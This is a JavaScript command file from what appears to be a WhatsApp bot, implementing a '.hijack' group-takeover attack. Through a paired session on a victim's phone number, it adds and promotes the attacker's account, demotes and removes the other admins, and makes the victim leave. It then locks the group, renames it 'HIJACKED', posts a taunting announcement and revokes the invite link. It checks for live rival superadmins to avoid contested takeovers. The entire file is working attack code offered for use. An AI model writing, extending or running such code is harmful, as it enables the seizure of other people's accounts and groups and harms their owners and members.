// language: JavaScript, file: commands/hijack/hijack.js
'use strict';
const { bootHijackSession }                     = require('../../lib/hijackSession');
const { extractPhone, rankOf, resolveJid,
        checkAccountStatus }                    = require('../../lib/hijackHelper');

// subject fits WA's ~100-char cap. this is 23 chars.
const NEW_SUBJECT = '𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 ʙʏ 𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳';

const FULL_ANNOUNCEMENT =
`𝙏𝙃𝙄𝙎 𝙂𝙍𝙊𝙐𝙋 𝙃𝘼𝙎 𝘽𝙀𝙀𝙉 𝙃𝙄𝙅𝘼𝘾𝙆𝙀𝘿 𝘽𝙔 𝙈𝘼𝘿𝘼𝙍𝘼 𝙓-𝙈𝘿 | 𝙄𝙉𝘾.

𝙏𝙃𝙀 𝙀𝙔𝙀 𝙊𝙋𝙀𝙉𝙎 ＴＨＥ ＧＨＯＳＴ ＯＦ ＴＨＥ ＵＣＨＩＨ𝘼

ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴀᴅᴀʀᴀ x-ᴍᴅ`;

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function demoteAdmins(hijackSock, groupJid, jids) {
    if (!jids.length) return { demoted: 0, failed: 0 };
    const slow   = jids.length > 4;
    const gapMs  = slow ? 3000 : 150;
    let demoted  = 0, failed = 0;

    try {
        await hijackSock.groupParticipantsUpdate(groupJid, jids, 'demote');
        return { demoted: jids.length, failed: 0 };
    } catch {}

    for (const j of jids) {
        try { await hijackSock.groupParticipantsUpdate(groupJid, [j], 'demote'); demoted++; }
        catch { failed++; }
        await sleep(gapMs);
    }
    return { demoted, failed };
}

async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log) {
    for (let i = 0; i < 15; i++) {
        try {
            const meta = await attackerSock.groupMetadata(groupJid);
            const me   = meta.participants.find(p => extractPhone(p.id) === extractPhone(attackerJid));
            if (me && rankOf(me) === 2) return true;
        } catch (e) { log?.(`[hijack:promote poll ${i}] ${e.message}`); }
        await sleep(900);
    }
    return false;
}

async function lockAndRename(attackerSock, groupJid, log) {
    let locked = false, renamed = false, announced = false;

    for (let i = 0; i < 3 && !locked; i++) {
        try { await attackerSock.groupSettingUpdate(groupJid, 'announcement'); locked = true; }
        catch (e) { log?.(`[hijack:lock try ${i}] ${e.message}`); await sleep(1500); }
    }
    for (let i = 0; i < 3 && !renamed; i++) {
        try { await attackerSock.groupUpdateSubject(groupJid, NEW_SUBJECT); renamed = true; }
        catch (e) { log?.(`[hijack:rename try ${i}] ${e.message}`); await sleep(1500); }
    }
    for (let i = 0; i < 3 && !announced; i++) {
        try { await attackerSock.sendMessage(groupJid, { text: FULL_ANNOUNCEMENT }); announced = true; }
        catch (e) { log?.(`[hijack:announce try ${i}] ${e.message}`); await sleep(1500); }
    }

    return { locked, renamed, announced };
}

async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock, opts = {}) {
    const { log, onPhase } = opts;
    const result = {
        groupJid, attackerJid,
        contested: false, contestedSafe: false,
        added: false, promoted: false, demoted: 0, removed: 0,
        left: false, promotedToSuper: false,
        locked: false, renamed: false, announced: false, revoked: false,
        aborted: false, reason: null,
    };

    onPhase?.('ʀᴇsᴏʟᴠᴇ ᴛᴀʀɢᴇᴛ');
    const meta = await targetSock.groupMetadata(groupJid).catch((e) => { throw new Error(`meta: ${e.message}`); });
    const targetPhone = extractPhone(targetSock.user?.id);
    const targetPart  = meta.participants.find(p => {
        return extractPhone(p.id) === targetPhone
            || extractPhone(p.lid) === targetPhone
            || p.id === targetSock.user?.id;
    });
    if (!targetPart) { result.aborted = true; result.reason = 'target not in group'; return result; }
    if (rankOf(targetPart) !== 2) { result.aborted = true; result.reason = 'target not superadmin'; return result; }

    onPhase?.('sᴄᴀɴ sᴜᴘᴇʀᴀᴅᴍɪɴs');
    const otherSupers = meta.participants.filter(p => p !== targetPart && rankOf(p) === 2);

    if (otherSupers.length) {
        result.contested = true;
        let anyAlive = false;
        for (const os of otherSupers) {
            const resolved = await resolveJid(targetSock, groupJid, os.id);
            const st = await checkAccountStatus(targetSock, resolved);
            log?.(`[hijack:contest] ${extractPhone(resolved)} → ${st.status}`);
            if (st.status === 'alive' || st.status === 'unknown') anyAlive = true;
        }
        if (anyAlive) { result.aborted = true; result.reason = 'contested — live superadmin'; return result; }
        result.contestedSafe = true;
    }

    onPhase?.('ᴀᴅᴅ ᴀᴛᴛᴀᴄᴋᴇʀ');
    const present = meta.participants.some(p => extractPhone(p.id) === extractPhone(attackerJid));
    if (!present) {
        try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'add'); result.added = true; }
        catch (e) { log?.(`[hijack:add] ${e.message}`); }
        await sleep(1500);
    } else { result.added = true; }

    onPhase?.('ᴘʀᴏᴍᴏᴛᴇ ᴀᴛᴛᴀᴄᴋᴇʀ');
    try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'promote'); result.promoted = true; }
    catch (e) { log?.(`[hijack:promote] ${e.message}`); }
    await sleep(1500);

    onPhase?.('ᴅᴇᴍᴏᴛᴇ ᴀᴅᴍɪɴs');
    const otherAdmins = meta.participants
        .filter(p => p !== targetPart && rankOf(p) === 1)
        .map(p => p.id);
    const dem = await demoteAdmins(targetSock, groupJid, otherAdmins);
    result.demoted = dem.demoted;

    onPhase?.('ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴs');
    for (const j of otherAdmins) {
        try { await targetSock.groupParticipantsUpdate(groupJid, [j], 'remove'); result.removed++; }
        catch (e) { log?.(`[hijack:remove ${extractPhone(j)}] ${e.message}`); }
        await sleep(800);
    }

    onPhase?.('ᴛᴀʀɢᴇᴛ ʟᴇᴀᴠᴇs');
    try { await targetSock.groupLeave(groupJid); result.left = true; }
    catch (e) { log?.(`[hijack:leave] ${e.message}`); }

    onPhase?.('ᴡᴀɪᴛ sᴜᴘᴇʀᴀᴅᴍɪɴ');
    result.promotedToSuper = await waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log);
    if (!result.promotedToSuper) { result.aborted = true; result.reason = 'attacker not promoted'; return result; }

    onPhase?.('ʟᴏᴄᴋ + ʀᴇɴᴀᴍᴇ');
    const lr = await lockAndRename(attackerSock, groupJid, log);
    result.locked    = lr.locked;
    result.renamed   = lr.renamed;
    result.announced = lr.announced;

    onPhase?.('ʀᴇᴠᴏᴋᴇ ɪɴᴠɪᴛᴇ');
    try {
        const code = await attackerSock.groupRevokeInvite(groupJid);
        result.revoked = !!code;
    } catch (e) { log?.(`[hijack:revoke] ${e.message}`); }

    return result;
}

module.exports = {
    name: 'hijack',
    aliases: ['hjack', 'takeover', 'seize'],
    category: 'hijack',
    desc: '👁️ ɢʀᴏᴜᴘ ᴛᴀᴋᴇᴏᴠᴇʀ ᴠɪᴀ ᴘᴀɪʀᴇᴅ sᴇssɪᴏɴ',
    usage: '.hijack <targetPhone> <groupLink or JID>',
    privateOnly: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        
        // Smart arg parsing — order doesn't matter.
        // Link/JID goes to groupJid, digits go to targetPhone.
        let targetPhone = null;
        let groupTarget = null;

        for (const arg of args) {
            if (arg.includes('chat.whatsapp.com') || arg.endsWith('@g.us')) {
                groupTarget = arg;
            } else if (/^\d{7,15}$/.test(arg.replace(/\D/g, ''))) {
                targetPhone = arg.replace(/\D/g, '');
            }
        }

        if (!targetPhone || !groupTarget) {
            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijack <ᴛᴀʀɢᴇᴛᴘʜᴏɴᴇ> <ɢʀᴏᴜᴘ ʟɪɴᴋ ᴏʀ ᴊɪᴅ>${s.FOOTER}`);
        }

        const scopeKey    = ctx.sender;
        const attackerJid = sock.user?.id || ctx.sender;

        if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
        if (!attackerJid) return ctx.reply(`❌ ʙᴏᴛ sᴇssɪᴏɴ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);

        // Resolve group link to JID
        let groupJid = groupTarget;
        if (groupJid.includes('chat.whatsapp.com')) {
            await ctx.reply(`⏳ ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...${s.FOOTER}`);
            let code = groupJid.split('/').pop().split('?')[0].trim();
            try {
                const info = await sock.groupGetInviteInfo(code);
                if (info?.id) groupJid = info.id;
                else throw new Error('Info not returned');
            } catch (e) {
                return ctx.reply(`❌ ɢʀᴏᴜᴘ ʟɪɴᴋ ʀᴇsᴏʟᴠᴇ ғᴀɪʟ: ${e.message}${s.FOOTER}`);
            }
        }

        let targetSock = null;
        await ctx.reply(`⏳ ʙᴏᴏᴛɪɴɢ ʜɪᴊᴀᴄᴋ sᴇssɪᴏɴ ғᴏʀ +${targetPhone}...${s.FOOTER}`);

        try { targetSock = await bootHijackSession(scopeKey, targetPhone); }
        catch (e) { return ctx.reply(`❌ sᴇssɪᴏɴ ʙᴏᴏᴛ ғᴀɪʟ: ${e.message}${s.FOOTER}`); }

        try {
            const result = await takeoverSequence(
                targetSock, groupJid, attackerJid, sock,
                {
                    log: (m) => console.error('[hijack]', m),
                    onPhase: async (p) => { try { await ctx.reply(`▸ ${p}${s.FOOTER}`); } catch {} },
                }
            );

            const lines = [
                `╭═══〘 ʜɪᴊᴀᴄᴋ ʀᴇᴘᴏʀᴛ 〙═══⊷❍`,
                `┃ 🎯 ${groupJid}`,
                `┃ 👤 ᴛᴀʀɢᴇᴛ +${targetPhone}`,
                `┃ ⚔️ ᴀᴛᴛᴀᴄᴋᴇʀ ${extractPhone(attackerJid)}`,
                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄`,
                `┃ ${result.contested ? (result.contestedSafe ? '🟡 ᴄᴏɴᴛᴇsᴛᴇᴅ (sᴀғᴇ)' : '🔴 ᴄᴏɴᴛᴇsᴛᴇᴅ') : '🟢 ᴜɴᴄᴏɴᴛᴇsᴛᴇᴅ'}`,
                `┃ ${result.added ? '✅' : '❌'} ᴀᴅᴅᴇᴅ`,
                `┃ ${result.promoted ? '✅' : '❌'} ᴘʀᴏᴍᴏᴛᴇᴅ`,
                `┃ 📉 ᴅᴇᴍᴏᴛᴇᴅ ${result.demoted}`,
                `┃ 🚫 ʀᴇᴍᴏᴠᴇᴅ ${result.removed}`,
                `┃ ${result.left ? '✅' : '❌'} ᴛᴀʀɢᴇᴛ ʟᴇғᴛ`,
                `┃ ${result.promotedToSuper ? '✅' : '❌'} sᴜᴘᴇʀᴀᴅᴍɪɴ`,
                `┃ ${result.locked ? '✅' : '❌'} ʟᴏᴄᴋᴇᴅ`,
                `┃ ${result.renamed ? '✅' : '❌'} ʀᴇɴᴀᴍᴇᴅ`,
                `┃ ${result.announced ? '✅' : '❌'} ᴀɴɴᴏᴜɴᴄᴇᴅ`,
                `┃ ${result.revoked ? '✅' : '❌'} ɪɴᴠɪᴛᴇ ʀᴇᴠᴏᴋᴇᴅ`,
                `┃ ${result.aborted ? `⛔ ${result.reason}` : '🏁 ᴄᴏᴍᴘʟᴇᴛᴇ'}`,
                `╰══════════════════════════`,
            ];
            await ctx.reply(lines.join('\n') + s.FOOTER);
        } finally {
            try { await targetSock?.end?.(undefined); } catch {}
        }
    }
};